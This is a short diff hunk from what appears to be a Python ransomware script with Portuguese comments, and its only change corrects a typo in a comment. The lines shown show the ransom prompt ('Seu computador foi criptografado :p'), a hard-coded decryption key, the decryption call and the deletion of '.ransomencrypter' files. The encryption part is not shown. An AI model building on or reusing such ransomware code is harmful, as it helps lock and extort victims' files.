@@ -67,7 +67,7 @@ if __name__ == '__main__': #conceito da variável __name__, com uma condição q
     criptografando()
     if criptografando:
         key = input('Seu computador foi criptografado :p, informe a chave  para liberar os arquivos:')
-        if key == 'lkghpryvxzkjfdtc':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
+        if key == 'lkghpryvxzkjfdtc':  # confirma se a chave de descriptografia foi colocada corretamente e então descriptografa
             descrypt(key)
             for del_file in glob.glob('*.ransomencrypter'):
                 os.remove(f'{desktop}\\{del_file}')
